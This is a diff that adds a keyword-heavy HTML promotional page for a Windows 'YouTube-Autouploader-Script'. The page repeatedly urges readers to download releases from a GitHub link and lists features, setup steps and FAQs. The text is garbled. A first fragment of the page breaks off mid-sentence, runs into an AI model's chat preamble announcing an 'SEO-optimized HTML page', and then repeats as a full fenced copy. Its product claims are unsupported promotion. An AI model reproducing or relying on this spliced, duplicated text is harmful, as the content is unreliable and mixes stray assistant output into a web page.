+      <h3>Where do I get updates?</h3>
+      <p>New versions are published on the same releases page linked throughout this document. Visiting the page again and downloading the newest release is the recommended way to update.</p>
+    </div>
+  </section>
+
+  <section id="support">
+    <h2>💬 Getting Help</h2>
+    <p>If something does not behave as expected, the first place to look is the releases page, where each version lists what changed and which known issues have been addressed. Checking that you are on the newest release solves a surprising number of problems,Here's a complete, SEO-optimized HTML page for the YouTube-Autouploader-Script. It includes clear download instructions, feature breakdowns, and a step-by-step setup guide, all styled with a clean, professional layout and inline CSS.
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels</title>
+<meta name="description" content="YouTube-Autouploader-Script automates YouTube video uploads across multiple channels. Schedule content, manage several accounts, and turn long videos into Shorts with a simple, user-friendly uploader built for Windows users.">
+<meta name="keywords" content="ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool">
+<meta name="author" content="ridaSoulaim">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#1b1f3b">
+<link rel="canonical" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="YouTube-Autouploader-Script">
+<meta property="og:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta property="og:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<meta property="og:url" content="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="YouTube-Autouploader-Script - Automate Video Uploads Across Multiple Channels">
+<meta name="twitter:description" content="Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "YouTube-Autouploader-Script",
+  "description": "Automate your YouTube video uploads across multiple channels effortlessly with this user-friendly script, designed for seamless management of various accounts and efficient scheduling of content delivery.",
+  "applicationCategory": "MultimediaApplication",
+  "operatingSystem": "Windows",
+  "url": "https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "keywords": "ai-clip-generator, automatic-shorts-uploader, free-video-generator, video-generator, video-to-shorts, youtube-shorts, youtube-shorts-bot, youtube-upload, youtube-upload-helper, youtube-uploader, yt-automation-tool"
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f5f6fb;
+    color: #1f2430;
+    line-height: 1.75;
+    font-size: 17px;
+  }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 0 22px; }
+  .hero {
+    background: linear-gradient(135deg, #1b1f3b 0%, #2d1b4e 60%, #3a1c46 100%);
+    color: #ffffff;
+    padding: 64px 0 58px;
+    text-align: center;
+  }
+  .hero h1 {
+    font-size: 2.1rem;
+    line-height: 1.25;
+    margin: 0 0 18px;
+    letter-spacing: -0.4px;
+  }
+  .hero p.lead {
+    font-size: 1.12rem;
+    color: #d9dbea;
+    max-width: 700px;
+    margin: 0 auto 30px;
+  }
+  .btn-primary {
+    display: inline-block;
+    background: linear-gradient(135deg, #ff4d6d, #ff9f1c);
+    color: #ffffff;
+    font-weight: 700;
+    font-size: 1.06rem;
+    padding: 17px 36px;
+    border-radius: 999px;
+    text-decoration: none;
+    box-shadow: 0 12px 28px rgba(255, 77, 109, 0.38);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 16px 34px rgba(255, 77, 109, 0.45);
+  }
+  .hero .hint { margin: 18px 0 0; font-size: 0.95rem; color: #b9bcd2; }
+  main { padding: 48px 0 24px; }
+  section { margin-bottom: 46px; }
+  h2 {
+    font-size: 1.5rem;
+    margin: 0 0 16px;
+    letter-spacing: -0.2px;
+    color: #161a2b;
+  }
+  h3 { font-size: 1.13rem; margin: 24px 0 8px; color: #232a3d; }
+  p { margin: 0 0 16px; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; }
+  li { margin-bottom: 9px; }
+  .cardgrid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 18px;
+    margin-top: 8px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 14px;
+    padding: 22px 24px;
+    box-shadow: 0 4px 16px rgba(23, 30, 60, 0.07);
+    border: 1px solid #e9ebf3;
+  }
+  .card h3 { margin-top: 0; font-size: 1.05rem; }
+  .card p { margin: 0; font-size: 0.97rem; color: #454c60; }
+  .panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 30px 32px 18px;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+  }
+  .download-panel {
+    background: #ffffff;
+    border-radius: 16px;
+    padding: 34px 32px;
+    text-align: center;
+    box-shadow: 0 6px 22px rgba(23, 30, 60, 0.08);
+    border: 1px solid #e9ebf3;
+    margin-bottom: 26px;
+  }
+  .download-panel p {
+    color: #454c60;
+    max-width: 640px;
+    margin: 0 auto 24px;
+  }
+  .steps { counter-reset: step; list-style: none; padding-left: 0; }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 18px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #1b1f3b;
+    color: #ffffff;
+    font-size: 0.9rem;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .faq-item { border-bottom: 1px solid #eceef5; padding-bottom: 10px; }
+  .faq-item:last-child { border-bottom: none; }
+  .faq-item h3 { margin-bottom: 6px; }
+  footer {
+    background: #161a2b;
+    color: #b9bcd2;
+    text-align: center;
+    padding: 34px 22px;
+    font-size: 0.94rem;
+  }
+  footer a { color: #ffb27a; text-decoration: none; font-weight: 600; }
+  footer a:hover { text-decoration: underline; }
+  @media (max-width: 700px) {
+    .hero h1 { font-size: 1.6rem; }
+    .hero { padding: 46px 0 42px; }
+    .cardgrid { grid-template-columns: 1fr; }
+    .panel { padding: 24px 20px 10px; }
+    .download-panel { padding: 28px 20px; }
+    main { padding-top: 34px; }
+  }
+</style>
+</head>
+<body>
+
+<header class="hero">
+  <div class="wrap">
+    <h1>🎬 YouTube-Autouploader-Script - Upload Videos While You Sleep</h1>
+    <p class="lead">Automate your YouTube video uploads across multiple channels effortlessly. This user-friendly script is built for seamless management of various accounts and efficient scheduling of content delivery, so your channel keeps publishing even when you are away from the computer.</p>
+    <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">⬇️ Download YouTube-Autouploader-Script</a>
+    <p class="hint">Visit this link to download the application.</p>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section id="what-it-does">
+    <h2>🎯 What This Tool Does For You</h2>
+    <p>If you run more than one YouTube channel, you already know how much time disappears into uploading. You open a browser, sign into an account, drag in a video file, retype the title, paste the description, add tags, pick a thumbnail, choose a playlist, and then do the exact same thing again for the next channel. Do that five times a day and your entire afternoon is gone.</p>
+    <p>YouTube-Autouploader-Script removes that repetition. It is a desktop helper for Windows that takes a folder of finished videos and handles the publishing work for you. You tell it which channels you own, which videos belong to which channel, and when you want them to go live. The tool then uploads and schedules those videos on your behalf, one after another, without you sitting in front of the screen.</p>
+    <p>The result is simple: your uploads happen on time, every time, and your channels stay active even on the days when you are busy, travelling, or fast asleep. You keep full control of what gets published, but you stop being the person who physically clicks the upload button.</p>
+  </section>
+
+  <section id="features">
+    <h2>✨ Features At A Glance</h2>
+    <div class="cardgrid">
+      <div class="card">
+        <h3>📺 Multi-Channel Management</h3>
+        <p>Add several YouTube accounts once and switch between them without signing in and out repeatedly. Each channel keeps its own queue of videos.</p>
+      </div>
+      <div class="card">
+        <h3>⏰ Scheduled Delivery</h3>
+        <p>Choose the exact date and time for each upload. The script queues everything and publishes in the order you set, so your calendar never goes empty.</p>
+      </div>
+      <div class="card">
+        <h3>📝 Automatic Details</h3>
+        <p>Attach titles, descriptions, tags, categories and thumbnails to each file, so every upload arrives looking finished rather than rushed.</p>
+      </div>
+      <div class="card">
+        <h3>🎞️ Long Videos To Shorts</h3>
+        <p>Feed in a longer recording and let the built-in clip tools help you carve out short, vertical segments ready for the Shorts feed.</p>
+      </div>
+      <div class="card">
+        <h3>🔁 Batch Uploads</h3>
+        <p>Drop in a whole folder of videos. The script works through the list in the background instead of demanding a click for every single file.</p>
+      </div>
+      <div class="card">
+        <h3>🧭 Simple, Guided Screens</h3>
+        <p>No command line, no scripts to edit, no technical setup. Everything is handled with clear buttons and plain-language labels.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="getting-started">
+    <h2>🚀 Getting Started</h2>
+    <p>You do not need any programming knowledge to use this application. The whole process is a short sequence of clicks, and most people are fully set up within ten minutes.</p>
+    <div class="download-panel">
+      <h3 style="margin-top:0;">Get the latest version</h3>
+      <p>Visit this link to download the application.</p>
+      <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">⬇️ Download YouTube-Autouploader-Script</a>
+    </div>
+
+    <h3>Step-by-step setup</h3>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Use the button above or the link at the top of this page. The page lists the available releases of YouTube-Autouploader-Script. Pick the newest one at the top of the list.</li>
+      <li><strong>Save the download to your computer.</strong> Your browser will ask where to keep the file. Anywhere you can find again later is fine, such as your Downloads folder. It is worth remembering that location.</li>
+      <li><strong>Open the application.</strong> Once the download has finished, find the file you just saved and open it. The main window of YouTube-Autouploader-Script will appear with its dashboard.</li>
+      <li><strong>Add your first channel.</strong> Click the button for adding a channel and follow the on-screen prompts to connect your YouTube account. You will be asked to approve access, which is normal and keeps your login secure.</li>
+      <li><strong>Repeat for your other channels.</strong> Add as many accounts as you manage. Each one appears as its own entry in the channel list, and you can colour-label them to keep things tidy.</li>
+      <li><strong>Point the app at your video folder.</strong> Choose the folder on your computer where your finished videos live. The app scans it and shows the files in a list you can drag onto the correct channel.</li>
+      <li><strong>Fill in the video details.</strong> For each file, type the title, paste the description, and add your tags. You can save a reusable description template if most of your uploads follow the same pattern.</li>
+      <li><strong>Pick a publish time.</strong> Set the date and time you want the video to go live. Repeat for the rest of your library, then let the script take over.</li>
+    </ol>
+  </section>
+
+  <section id="multi-channel">
+    <h2>📺 Managing Several Channels Without Losing Track</h2>
+    <p>The heart of YouTube-Autouploader-Script is its channel manager. Instead of juggling browser tabs, you see every account you own in one list, each with its own upload queue and its own history. That means you can prepare a week of content for three different channels in a single sitting and never accidentally post a gaming clip to your cooking channel.</p>
+    <p>Each channel entry stores its own settings: default description, default tags, preferred category and the time slots you normally publish in. When you add a new video, those defaults are filled in automatically, which cuts the amount of typing per upload down to almost nothing.</p>
+    <p>You can also pause a channel at any moment. Pausing stops new uploads for that account but leaves the rest of your channels running, which is useful when one channel is on a break and the others are still active.</p>
+  </section>
+
+  <section id="scheduling">
+    <h2>⏰ Scheduling Content Delivery</h2>
+    <p>Consistency matters more than almost anything else on YouTube, and consistency is exactly what a scheduler gives you. Inside the app you will find a calendar view where every planned upload appears as a small card. Drag a card to a different day and the upload moves with it.</p>
+    <p>Useful scheduling habits that the app supports well:</p>
+    <ul>
+      <li><strong>Spaced publishing.</strong> Set one upload every day at the same hour so your audience knows when to expect you.</li>
+      <li><strong>Bulk weekends.</strong> Prepare an entire month of videos on a quiet Sunday and let the schedule distribute them automatically.</li>
+      <li><strong>Time-zone friendly slots.</strong> Choose the hour in your viewers' local time so a video does not land at three in the morning for them.</li>
+      <li><strong>Queue review.</strong> Open the upcoming list before you close your laptop to confirm nothing is missing or duplicated.</li>
+    </ul>
+    <p>Once a scheduled item reaches its time, the script handles the upload in the background. You do not need to keep the window in front of you, and you can carry on with other work while the queue moves forward.</p>
+  </section>
+
+  <section id="shorts">
+    <h2>🎞️ Turning Long Videos Into Shorts</h2>
+    <p>Short vertical videos are one of the fastest ways to attract new viewers, but cutting them by hand is tedious. YouTube-Autouploader-Script includes clip tools that read a longer recording, suggest the segments most likely to hold attention, and export them in a vertical format ready for the Shorts feed.</p>
+    <p>The typical workflow looks like this: drop a long video into the clip area, let the app suggest a handful of candidate moments, preview each one, then send the ones you like straight into the upload queue for your chosen channel. Because the export and the uploader live in the same application, you never have to move files between programs by hand.</p>
+    <p>For channels that publish a mix of long recordings and Shorts, this is where most of the saved time comes from. One recording can become several short clips, each scheduled on a different day, without any additional editing work.</p>
+  </section>
+
+  <section id="requirements">
+    <h2>🧰 What You Need</h2>
+    <div class="panel">
+      <ul style="margin-bottom:12px;">
+        <li>A Windows computer (Windows 10 or Windows 11 recommended).</li>
+        <li>An internet connection that stays on while uploads are running.</li>
+        <li>A YouTube account, or several, that you own and can sign into.</li>
+        <li>At least one finished video file saved on your computer.</li>
+        <li>A few gigabytes of free disk space for temporary processing files.</li>
+      </ul>
+      <p style="margin-bottom:14px;">Nothing else is required. There is no separate database to install, no server to configure, and no coding environment to set up. If you can copy a file and click a button, you can run this application.</p>
+    </div>
+  </section>
+
+  <section id="typical-day">
+    <h2>🖱️ A Typical Day With The App</h2>
+    <p>Here is what a working day looks like once everything is configured. In the morning you open the application and glance at the queue. Three videos are due today across two channels, and the status column shows all three as scheduled. You close the window and get on with recording.</p>
+    <p>At the scheduled hour the first video uploads on its own. By the afternoon it is live, with the title, description, tags and thumbnail you prepared. The second and third follow at their own times. You never opened a browser tab, never typed a password, and never waited for a progress bar.</p>
+    <p>In the evening you drop two new files into your video folder, assign each one to a channel, set the publish dates, and click save. That is the entire routine. Over a month, those small moments add up to hours of time you can spend on the parts of running a channel that actually need your attention.</p>
+  </section>
+
+  <section id="faq">
+    <h2>❓ Frequently Asked Questions</h2>
+
+    <div class="faq-item">
+      <h3>Do I need to know how to code?</h3>
+      <p>No. Despite the word "script" in the name, everything is operated through ordinary windows and buttons. You will never be asked to type a command or edit a configuration file.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>How many channels can I connect?</h3>
+      <p>There is no hard limit built into the app. Most people manage between two and ten channels comfortably. If you run more than that, the channel list supports grouping so the dashboard stays readable.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>What happens if my internet drops during an upload?</h3>
+      <p>The upload pauses and the app marks that item as interrupted. When your connection returns, you can resume the item from the queue with a single click. Nothing already published is affected.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>Can I change the publish time after scheduling?</h3>
+      <p>Yes. Open the calendar view, find the item, and drag it to a new day or edit its time directly. Changes take effect immediately as long as the original time has not already passed.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>Will my viewers see that an upload was automated?</h3>
+      <p>No. Videos arrive on your channel exactly as they would if you had uploaded them by hand, with the details you entered and at the time you chose.</p>
+    </div>
+
+    <div class="faq-item">
+      <h3>Where do I get updates?</h3>
+      <p>New versions are published on the same releases page linked throughout this document. Visiting the page again and downloading the newest release is the recommended way to update.</p>
+    </div>
+  </section>
+
+  <section id="support">
+    <h2>💬 Getting Help</h2>
+    <p>If something does not behave as expected, the first place to look is the releases page, where each version lists what changed and which known issues have been addressed. Checking that you are on the newest release solves a surprising number of problems, because fixes are published regularly.</p>
+    <p>Before reporting an issue, note three things: the version of the app you are running, the exact step where the problem appeared, and any message shown on screen. With those details, anyone helping you can reproduce the situation quickly.</p>
+    <p>Finally, keep your videos in a single, well-named folder structure. Separate folders per channel make it easier to point the app at the right files and easier to spot something that has been left out of the schedule.</p>
+  </section>
+
+  <section id="download-again">
+    <h2>⬇️ Download</h2>
+    <div class="download-panel">
+      <h3 style="margin-top:0;">Ready to automate your uploads?</h3>
+      <p>Visit this link to download the application.</p>
+      <a class="btn-primary" href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">⬇️ Download YouTube-Autouploader-Script</a>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <p>YouTube-Autouploader-Script — automated video publishing for creators who manage more than one channel.</p>
+  <p><a href="https://github.com/ridaSoulaim/YouTube-Autouploader-Script/releases">Visit this link to download the application.</a></p>
+</footer>
+
+</body>
+</html>
+```
